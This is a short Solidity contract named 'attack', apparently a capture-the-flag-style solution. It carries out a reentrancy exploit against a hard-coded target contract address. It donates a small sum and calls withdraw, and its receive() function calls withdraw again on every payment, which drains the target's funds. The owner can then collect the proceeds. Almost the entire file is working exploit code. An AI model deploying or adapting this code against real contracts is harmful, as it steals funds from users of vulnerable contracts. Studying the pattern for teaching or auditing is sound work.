// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface reenter {
    function donate(address _to) external  payable;
    function balanceOf(address _who) external returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

event log(string msg);

contract attack {

    address target_address = 0xbe5A25f8362BE4314F4D6b55cC098945BD4dc3D1;
    address payable owner;
    uint amount = 1000000000000000 wei;
    reenter target= reenter(target_address); 
    constructor(){
        owner = payable(msg.sender);
    }

    function step1donate() payable public{
        target.donate{value: amount}(address(this));
    }

    function setp2withdraw() payable public {
        target.withdraw(amount);
    }


    receive() external payable { 
        target.withdraw(amount);
        emit log("trigger log");
    }

    function mywithdraw() external payable{
        require(msg.sender==owner,'not you');
        owner.transfer(address(this).balance);
    }
}
